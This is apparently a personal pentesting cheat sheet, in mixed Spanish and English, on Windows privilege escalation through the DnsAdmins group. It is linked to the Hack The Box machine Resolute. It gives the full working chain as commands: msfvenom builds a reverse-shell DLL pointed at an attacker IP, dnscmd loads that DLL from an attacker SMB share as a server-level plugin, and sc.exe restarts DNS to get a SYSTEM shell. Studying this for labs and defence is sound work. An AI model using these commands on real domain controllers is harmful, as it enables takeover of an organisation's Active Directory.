
## DESCRIPTION

Un usuario perteneciente al grupo DNSAdmin puede escalar privilegios y convertirse en Administrador.

![[Pasted image 20230306114843.png]]

This parameter enables the user that is a part of the DnsAdmins group to load a DLL which it doesn’t even monitor for content. DnsAdmins users can execute this DLL with elevated privilege which makes them susceptible to Privilege Escalation.

#### Mas información
* https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/
* https://0xdf.gitlab.io/2020/05/30/htb-resolute.html
* https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b

## EXPLOITATION

1. Crear nuestra DLL maliciosa, nosotros vamos a usar msfvenom pero existen otras alternativas.  To exploit that privilege, we need to craft a malicious DLL file. We will be using msfvenom with the shell_reverse_tcp payload. We name the file raj.dll. The file we created is on our Kali machine. We use the smbserver.py python script from Impacket to host the /root directory as demonstrated below.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o test.dll
```

![[Pasted image 20230306115524.png]]

2. Cargamos la DLL maliciosa. In the domain controller, run the dnscmd command below to load the malicious DLL (DNSPriv.dll) from our attacking machine.

***dnscmd is a windows utility that allows DNS Admins to manage the DNS server._**

```
dnscmd <<IP-LOCAL>> /config /serverlevelplugindll <<DLL maliciosa>> 

# Ejemplo usando smb
dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.23\shareDrive\DLLmaliciosa.dll
```

**!!NOTA IMPORTANTE!!** Si da fallo al subir la DLL o al ejecutarla, entonces prueba a levantar un directorio compartido

3. Una vez cargada, necesitamos ejecutarla. Para ejecutarla debemos reiniciar el servicio DNS.

```
sc.exe stop dns
sc.exe start dns
```

![[Pasted image 20230306115841.png]]

4. As we see, after the restart, dnscmd loaded our DLL, and we got the elevated shell as System.

![[Pasted image 20230306115903.png]]

## MACHINES

* Hack The Box: Resolute
